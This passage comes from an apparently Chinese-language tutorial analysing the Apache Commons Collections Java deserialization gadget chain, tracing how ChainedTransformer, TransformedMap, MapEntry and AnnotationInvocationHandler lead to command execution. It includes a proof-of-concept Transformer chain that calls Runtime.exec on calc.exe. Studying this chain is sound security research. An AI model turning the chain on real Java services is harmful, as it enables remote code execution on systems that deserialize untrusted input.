  <span style="color:#008000;font-weight:bold">private</span> <span style="color:#008000;font-weight:bold">final</span> Transformer<span style="color:#666">[]</span> iTransformers<span style="color:#666">;</span>

  <span style="color:#408080;font-style:italic">// 省去多余的方法和变量
</span><span style="color:#408080;font-style:italic"></span>
  <span style="color:#008000;font-weight:bold">public</span> <span style="color:#00f">ChainedTransformer</span><span style="color:#666">(</span>Transformer<span style="color:#666">[]</span> transformers<span style="color:#666">)</span> <span style="color:#666">{</span>
    <span style="color:#008000;font-weight:bold">super</span><span style="color:#666">();</span>
    iTransformers <span style="color:#666">=</span> transformers<span style="color:#666">;</span>
  <span style="color:#666">}</span>

  <span style="color:#008000;font-weight:bold">public</span> Object <span style="color:#00f">transform</span><span style="color:#666">(</span>Object object<span style="color:#666">)</span> <span style="color:#666">{</span>
      <span style="color:#008000;font-weight:bold">for</span> <span style="color:#666">(</span><span style="color:#b00040">int</span> i <span style="color:#666">=</span> 0<span style="color:#666">;</span> i <span style="color:#666">&lt;</span> iTransformers<span style="color:#666">.</span><span style="color:#7d9029">length</span><span style="color:#666">;</span> i<span style="color:#666">++)</span> <span style="color:#666">{</span>
          object <span style="color:#666">=</span> iTransformers<span style="color:#666">[</span>i<span style="color:#666">].</span><span style="color:#7d9029">transform</span><span style="color:#666">(</span>object<span style="color:#666">);</span>
      <span style="color:#666">}</span>
      <span style="color:#008000;font-weight:bold">return</span> object<span style="color:#666">;</span>
  <span style="color:#666">}</span>

<span style="color:#666">}</span>
</code></pre></td></tr></table>
</div>
</div><p>ChainedTransformer链执行命令：</p>
<div class="highlight"><div style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java"><span style="color:#008000;font-weight:bold">public</span> <span style="color:#008000;font-weight:bold">static</span> <span style="color:#b00040">void</span> <span style="color:#00f">main</span><span style="color:#666">(</span>String<span style="color:#666">[]</span> args<span style="color:#666">)</span> <span style="color:#666">{</span>
      <span style="color:#408080;font-style:italic">// 定义需要执行的本地系统命令
</span><span style="color:#408080;font-style:italic"></span>        String cmd <span style="color:#666">=</span> <span style="color:#ba2121">&#34;calc.exe&#34;</span><span style="color:#666">;</span>

        Transformer<span style="color:#666">[]</span> transformers <span style="color:#666">=</span> <span style="color:#008000;font-weight:bold">new</span> Transformer<span style="color:#666">[]{</span>
                <span style="color:#008000;font-weight:bold">new</span> ConstantTransformer<span style="color:#666">(</span>Runtime<span style="color:#666">.</span><span style="color:#7d9029">class</span><span style="color:#666">),</span>
                <span style="color:#008000;font-weight:bold">new</span> InvokerTransformer<span style="color:#666">(</span><span style="color:#ba2121">&#34;getMethod&#34;</span><span style="color:#666">,</span> <span style="color:#008000;font-weight:bold">new</span> Class<span style="color:#666">[]{</span>
                        String<span style="color:#666">.</span><span style="color:#7d9029">class</span><span style="color:#666">,</span> Class<span style="color:#666">[].</span><span style="color:#7d9029">class</span><span style="color:#666">},</span> <span style="color:#008000;font-weight:bold">new</span> Object<span style="color:#666">[]{</span>
                        <span style="color:#ba2121">&#34;getRuntime&#34;</span><span style="color:#666">,</span> <span style="color:#008000;font-weight:bold">new</span> Class<span style="color:#666">[</span>0<span style="color:#666">]}</span>
                <span style="color:#666">),</span>
                <span style="color:#008000;font-weight:bold">new</span> InvokerTransformer<span style="color:#666">(</span><span style="color:#ba2121">&#34;invoke&#34;</span><span style="color:#666">,</span> <span style="color:#008000;font-weight:bold">new</span> Class<span style="color:#666">[]{</span>
                        Object<span style="color:#666">.</span><span style="color:#7d9029">class</span><span style="color:#666">,</span> Object<span style="color:#666">[].</span><span style="color:#7d9029">class</span><span style="color:#666">},</span> <span style="color:#008000;font-weight:bold">new</span> Object<span style="color:#666">[]{</span>
                        <span style="color:#008000;font-weight:bold">null</span><span style="color:#666">,</span> <span style="color:#008000;font-weight:bold">new</span> Object<span style="color:#666">[</span>0<span style="color:#666">]}</span>
                <span style="color:#666">),</span>
                <span style="color:#008000;font-weight:bold">new</span> InvokerTransformer<span style="color:#666">(</span><span style="color:#ba2121">&#34;exec&#34;</span><span style="color:#666">,</span> <span style="color:#008000;font-weight:bold">new</span> Class<span style="color:#666">[]{</span>String<span style="color:#666">.</span><span style="color:#7d9029">class</span><span style="color:#666">},</span> <span style="color:#008000;font-weight:bold">new</span> Object<span style="color:#666">[]{</span>cmd<span style="color:#666">})</span>
        <span style="color:#666">};</span>

        <span style="color:#408080;font-style:italic">// 创建ChainedTransformer调用链对象
</span><span style="color:#408080;font-style:italic"></span>        Transformer transformedChain <span style="color:#666">=</span> <span style="color:#008000;font-weight:bold">new</span> ChainedTransformer<span style="color:#666">(</span>transformers<span style="color:#666">);</span>

      <span style="color:#408080;font-style:italic">// 执行对象转换操作
</span><span style="color:#408080;font-style:italic"></span>      transformedChain<span style="color:#666">.</span><span style="color:#7d9029">transform</span><span style="color:#666">(</span><span style="color:#008000;font-weight:bold">null</span><span style="color:#666">);</span>
<span style="color:#666">}</span>
</code></pre></td></tr></table>
</div>
</div><blockquote>
<p>注意：</p>
<p>InvokerTransformer 是调用对象的方法，并且需要传入该方法所需要的参数类型，所以Class[].class和是为了占位。</p>
<p><img src="assets/image-20211028164001-f3nipvm.png" alt="image.png"></p>
</blockquote>
<p>该 transformedChain 调用链每次循环后返回对象如图，简单来讲，就是ConstantTransformer得到一个Class对象，然后使用InvokerTransformer连续调用方法。</p>
<p><img src="assets/%E6%9C%AA%E5%91%BD%E5%90%8D%E8%A1%A8%E5%8D%95-20211016090555-lcyevm6.png" alt="未命名表单.png"></p>
<p>到了这里我们会发现，只要目标对传入的对象调用了transform方法就会触发RCE（这里的transformedChain就是我们试图传入的目标）。</p>
<p>那么什么情况下会对可控对象调用transform方法呐？最好的利用情况是当用户传入的输入流被反序列化以后，就能够直接进行攻击（也就是说当程序直接调用readObject方法时将触发漏洞），但实际上并没有，所以需要继续往下找。</p>
<h3 id="transformedmap类">TransformedMap类</h3>
<p>在org.apache.commons.collections.map.TransformedMap 类中，我们观察一下该类的作用：</p>
<p>首先是该类的构造方法受到了保护，需要通过decorate 方法创建。</p>
<div class="highlight"><div style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">8
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java"><span style="color:#008000;font-weight:bold">public</span> <span style="color:#008000;font-weight:bold">static</span> Map <span style="color:#00f">decorate</span><span style="color:#666">(</span>Map map<span style="color:#666">,</span> Transformer keyTransformer<span style="color:#666">,</span> Transformer valueTransformer<span style="color:#666">)</span> <span style="color:#666">{</span>
        <span style="color:#008000;font-weight:bold">return</span> <span style="color:#008000;font-weight:bold">new</span> TransformedMap<span style="color:#666">(</span>map<span style="color:#666">,</span> keyTransformer<span style="color:#666">,</span> valueTransformer<span style="color:#666">);</span>
    <span style="color:#666">}</span>
<span style="color:#008000;font-weight:bold">protected</span> <span style="color:#00f">TransformedMap</span><span style="color:#666">(</span>Map map<span style="color:#666">,</span> Transformer keyTransformer<span style="color:#666">,</span> Transformer valueTransformer<span style="color:#666">)</span> <span style="color:#666">{</span>
        <span style="color:#008000;font-weight:bold">super</span><span style="color:#666">(</span>map<span style="color:#666">);</span>
        <span style="color:#008000;font-weight:bold">this</span><span style="color:#666">.</span><span style="color:#7d9029">keyTransformer</span> <span style="color:#666">=</span> keyTransformer<span style="color:#666">;</span>
        <span style="color:#008000;font-weight:bold">this</span><span style="color:#666">.</span><span style="color:#7d9029">valueTransformer</span> <span style="color:#666">=</span> valueTransformer<span style="color:#666">;</span>
    <span style="color:#666">}</span>
</code></pre></td></tr></table>
</div>
</div><p>然后观察它的checkSetValue方法：</p>
<div class="highlight"><div style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java"><span style="color:#008000;font-weight:bold">protected</span> Object <span style="color:#00f">checkSetValue</span><span style="color:#666">(</span>Object value<span style="color:#666">)</span> <span style="color:#666">{</span>
        <span style="color:#008000;font-weight:bold">return</span> valueTransformer<span style="color:#666">.</span><span style="color:#7d9029">transform</span><span style="color:#666">(</span>value<span style="color:#666">);</span>
    <span style="color:#666">}</span>
</code></pre></td></tr></table>
</div>
</div><p>可以看到该方法会<strong>直接调用valueTransformer.transform</strong>,而valueTransformer是我们可以直接通过decorate构建的。换句话说，只要我们可以构建TransformedMap类（传入transformedChain对象）并调用其checkSetValue就可以RCE。</p>
<p>那么有什么类会构建TransformedMap类对象并且调用checkSetValue方法呐？</p>
<h3 id="abstractinputcheckedmapdecoratormapentry">AbstractInputCheckedMapDecorator.MapEntry</h3>
<p>org.apache.commons.collections.map.AbstractInputCheckedMapDecorator类是TransformedMap类的父类，其中定义了一个内部类：</p>
<p>继承自AbstractMapEntryDecorator类的MapEntry类，观察一下代码</p>
<div class="highlight"><div style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java">   <span style="color:#008000;font-weight:bold">static</span> <span style="color:#008000;font-weight:bold">class</span> <span style="color:#00f;font-weight:bold">MapEntry</span> <span style="color:#008000;font-weight:bold">extends</span> AbstractMapEntryDecorator <span style="color:#666">{</span>

        <span style="color:#408080;font-style:italic">/** The parent map */</span>
        <span style="color:#008000;font-weight:bold">private</span> <span style="color:#008000;font-weight:bold">final</span> AbstractInputCheckedMapDecorator parent<span style="color:#666">;</span>

        <span style="color:#008000;font-weight:bold">protected</span> <span style="color:#00f">MapEntry</span><span style="color:#666">(</span>Map<span style="color:#666">.</span><span style="color:#7d9029">Entry</span> entry<span style="color:#666">,</span> AbstractInputCheckedMapDecorator parent<span style="color:#666">)</span> <span style="color:#666">{</span>
            <span style="color:#008000;font-weight:bold">super</span><span style="color:#666">(</span>entry<span style="color:#666">);</span>
            <span style="color:#008000;font-weight:bold">this</span><span style="color:#666">.</span><span style="color:#7d9029">parent</span> <span style="color:#666">=</span> parent<span style="color:#666">;</span>
        <span style="color:#666">}</span>

        <span style="color:#008000;font-weight:bold">public</span> Object <span style="color:#00f">setValue</span><span style="color:#666">(</span>Object value<span style="color:#666">)</span> <span style="color:#666">{</span>
            value <span style="color:#666">=</span> parent<span style="color:#666">.</span><span style="color:#7d9029">checkSetValue</span><span style="color:#666">(</span>value<span style="color:#666">);</span>
            <span style="color:#008000;font-weight:bold">return</span> entry<span style="color:#666">.</span><span style="color:#7d9029">setValue</span><span style="color:#666">(</span>value<span style="color:#666">);</span>
        <span style="color:#666">}</span>
    <span style="color:#666">}</span>
</code></pre></td></tr></table>
</div>
</div><p>可以看到，它的setValue 方法会调用其parent的checkSetValue方法，只要我们在构建MapEntry对象的时候parent设置传入TransformedMap类对象，然后并且调用setValue即可RCE。所以我们现在应该想谁会创建MapEntry对象并且调用setValue方法。</p>
<h3 id="annotationinvocationhandler类jdk版本要小于18">AnnotationInvocationHandler类（JDK版本要小于1.8）</h3>
<p>这个类是Java 就是内部类sun.reflect.annotation.AnnotationInvocationHandler,从注释可见该类是Annotation的动态代理实现类。</p>
<p>源代码：<a href="http://www.docjar.com/html/api/sun/reflect/annotation/AnnotationInvocationHandler.java.html">http://www.docjar.com/html/api/sun/reflect/annotation/AnnotationInvocationHandler.java.html</a></p>
<p>我们来看一下这个类重写的readObject方法：</p>
<div class="highlight"><div style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java">  328       <span style="color:#008000;font-weight:bold">private</span> <span style="color:#b00040">void</span> <span style="color:#00f">readObject</span><span style="color:#666">(</span>java<span style="color:#666">.</span><span style="color:#7d9029">io</span><span style="color:#666">.</span><span style="color:#7d9029">ObjectInputStream</span> s<span style="color:#666">)</span>
  329           <span style="color:#008000;font-weight:bold">throws</span> java<span style="color:#666">.</span><span style="color:#7d9029">io</span><span style="color:#666">.</span><span style="color:#7d9029">IOException</span><span style="color:#666">,</span> ClassNotFoundException <span style="color:#666">{</span>
  330           s<span style="color:#666">.</span><span style="color:#7d9029">defaultReadObject</span><span style="color:#666">();</span>
  331   
  332   
  333           <span style="color:#408080;font-style:italic">// Check to make sure that types have not evolved incompatibly
</span><span style="color:#408080;font-style:italic"></span>  334   
  335           AnnotationType annotationType <span style="color:#666">=</span> <span style="color:#008000;font-weight:bold">null</span><span style="color:#666">;</span>
  336           <span style="color:#008000;font-weight:bold">try</span> <span style="color:#666">{</span>
  337               annotationType <span style="color:#666">=</span> AnnotationType<span style="color:#666">.</span><span style="color:#7d9029">getInstance</span><span style="color:#666">(</span>type<span style="color:#666">);</span>
  338           <span style="color:#666">}</span> <span style="color:#008000;font-weight:bold">catch</span><span style="color:#666">(</span>IllegalArgumentException e<span style="color:#666">)</span> <span style="color:#666">{</span>
  339               <span style="color:#408080;font-style:italic">// Class is no longer an annotation type; all bets are off
</span><span style="color:#408080;font-style:italic"></span>  340               <span style="color:#008000;font-weight:bold">return</span><span style="color:#666">;</span>
  341           <span style="color:#666">}</span>
  342   
  343           Map<span style="color:#666">&lt;</span>String<span style="color:#666">,</span> Class<span style="color:#666">&lt;?&gt;&gt;</span> memberTypes <span style="color:#666">=</span> annotationType<span style="color:#666">.</span><span style="color:#7d9029">memberTypes</span><span style="color:#666">();</span>
  344   
  345           <span style="color:#00f">for</span> <span style="color:#666">(</span>Map<span style="color:#666">.</span><span style="color:#7d9029">Entry</span><span style="color:#666">&lt;</span>String<span style="color:#666">,</span> Object<span style="color:#666">&gt;</span> memberValue <span style="color:#666">:</span> memberValues<span style="color:#666">.</span><span style="color:#7d9029">entrySet</span><span style="color:#666">())</span> <span style="color:#666">{</span>
  346               String name <span style="color:#666">=</span> memberValue<span style="color:#666">.</span><span style="color:#7d9029">getKey</span><span style="color:#666">();</span>
  347               Class<span style="color:#666">&lt;?&gt;</span> memberType <span style="color:#666">=</span> memberTypes<span style="color:#666">.</span><span style="color:#7d9029">get</span><span style="color:#666">(</span>name<span style="color:#666">);</span>
  348               <span style="color:#00f">if</span> <span style="color:#666">(</span>memberType <span style="color:#666">!=</span> <span style="color:#008000;font-weight:bold">null</span><span style="color:#666">)</span> <span style="color:#666">{</span>  <span style="color:#408080;font-style:italic">// i.e. member still exists
</span><span style="color:#408080;font-style:italic"></span>  349                   Object value <span style="color:#666">=</span> memberValue<span style="color:#666">.</span><span style="color:#7d9029">getValue</span><span style="color:#666">();</span>
  350                   <span style="color:#00f">if</span> <span style="color:#666">(!(</span>memberType<span style="color:#666">.</span><span style="color:#7d9029">isInstance</span><span style="color:#666">(</span>value<span style="color:#666">)</span> <span style="color:#666">||</span>
  351                         value <span style="color:#008000;font-weight:bold">instanceof</span> ExceptionProxy<span style="color:#666">))</span> <span style="color:#666">{</span>
  352                       memberValue<span style="color:#666">.</span><span style="color:#7d9029">setValue</span><span style="color:#666">(</span>
  353                           <span style="color:#008000;font-weight:bold">new</span> <span style="color:#00f">AnnotationTypeMismatchExceptionProxy</span><span style="color:#666">(</span>
  354                               value<span style="color:#666">.</span><span style="color:#7d9029">getClass</span><span style="color:#666">()</span> <span style="color:#666">+</span> <span style="color:#ba2121">&#34;[&#34;</span> <span style="color:#666">+</span> value <span style="color:#666">+</span> <span style="color:#ba2121">&#34;]&#34;</span><span style="color:#666">).</span><span style="color:#7d9029">setMember</span><span style="color:#666">(</span>
  355                                   annotationType<span style="color:#666">.</span><span style="color:#7d9029">members</span><span style="color:#666">().</span><span style="color:#7d9029">get</span><span style="color:#666">(</span>name<span style="color:#666">)));</span>
  356                   <span style="color:#666">}</span>
  357               <span style="color:#666">}</span>
  358           <span style="color:#666">}</span>
  359       <span style="color:#666">}</span>
</code></pre></td></tr></table>
</div>
</div><p>从代码中可见该方法依次进行以下操作：</p>
<ul>
<li>
<p>1.调用defaultReadObject()进行默认的反序列化。</p>
</li>
<li>
<p>2.实例化一个AnnotationType类，该类为一个运行时的注解类，用于类型检查注释和应用成员默认值。
注意：这里使用了getInstance(type)来创建实例，其代码为：</p>
<div class="highlight"><div style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java">  <span style="color:#008000;font-weight:bold">public</span> <span style="color:#008000;font-weight:bold">static</span> AnnotationType <span style="color:#00f">getInstance</span><span style="color:#666">(</span>
        Class<span style="color:#666">&lt;?</span> <span style="color:#008000;font-weight:bold">extends</span> Annotation<span style="color:#666">&gt;</span> annotationClass<span style="color:#666">)</span>
    <span style="color:#666">{</span>
        JavaLangAccess jla <span style="color:#666">=</span> sun<span style="color:#666">.</span><span style="color:#7d9029">misc</span><span style="color:#666">.</span><span style="color:#7d9029">SharedSecrets</span><span style="color:#666">.</span><span style="color:#7d9029">getJavaLangAccess</span><span style="color:#666">();</span>
        AnnotationType result <span style="color:#666">=</span> jla<span style="color:#666">.</span><span style="color:#7d9029">getAnnotationType</span><span style="color:#666">(</span>annotationClass<span style="color:#666">);</span> <span style="color:#408080;font-style:italic">// volatile read
</span><span style="color:#408080;font-style:italic"></span>        <span style="color:#008000;font-weight:bold">if</span> <span style="color:#666">(</span>result <span style="color:#666">==</span> <span style="color:#008000;font-weight:bold">null</span><span style="color:#666">)</span> <span style="color:#666">{</span>
            result <span style="color:#666">=</span> <span style="color:#008000;font-weight:bold">new</span> AnnotationType<span style="color:#666">(</span>annotationClass<span style="color:#666">);</span>
            <span style="color:#408080;font-style:italic">// try to CAS the AnnotationType: null -&gt; result
</span><span style="color:#408080;font-style:italic"></span>            <span style="color:#008000;font-weight:bold">if</span> <span style="color:#666">(!</span>jla<span style="color:#666">.</span><span style="color:#7d9029">casAnnotationType</span><span style="color:#666">(</span>annotationClass<span style="color:#666">,</span> <span style="color:#008000;font-weight:bold">null</span><span style="color:#666">,</span> result<span style="color:#666">))</span> <span style="color:#666">{</span>
                <span style="color:#408080;font-style:italic">// somebody was quicker -&gt; read it&#39;s result
</span><span style="color:#408080;font-style:italic"></span>                result <span style="color:#666">=</span> jla<span style="color:#666">.</span><span style="color:#7d9029">getAnnotationType</span><span style="color:#666">(</span>annotationClass<span style="color:#666">);</span>
                <span style="color:#008000;font-weight:bold">assert</span> result <span style="color:#666">!=</span> <span style="color:#008000;font-weight:bold">null</span><span style="color:#666">;</span>
            <span style="color:#666">}</span>
        <span style="color:#666">}</span>

        <span style="color:#008000;font-weight:bold">return</span> result<span style="color:#666">;</span>
    <span style="color:#666">}</span>
</code></pre></td></tr></table>
</div>
</div><p>主要还是：</p>
<div class="highlight"><div style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
